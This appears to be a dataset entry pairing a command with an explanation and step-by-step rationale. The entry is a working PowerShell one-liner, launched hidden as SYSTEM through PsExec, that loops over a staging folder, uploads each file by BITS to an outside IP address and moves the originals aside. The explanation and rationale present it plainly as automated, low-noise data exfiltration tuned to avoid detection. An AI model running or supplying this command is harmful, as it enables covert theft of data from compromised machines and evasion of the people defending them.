command: psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; $sent='C:\ProgramData\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\Intel\staging' -File | ForEach-Object { try { $u='https://203.0.113.25/bits/' + $_.Name; Start-BitsTransfer -Source $_.FullName -Destination $u -TransferType Upload -Authentication NONE -Asynchronous | Out-Null; Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } catch {} }; Start-Sleep 180 }"
explanation: Uses BITS to asynchronously upload staged files to an HTTPS endpoint and then relocates the originals. The loop provides automated, low-noise exfiltration.
rationale_steps: Run as hidden SYSTEM via PSExec.
Enumerate files in a staging directory for upload.
Start asynchronous BITS upload jobs to reduce interactive noise.
Move files to a 'sent' folder after job initiation to avoid re-processing.
Pause between scans to minimize detection surface.
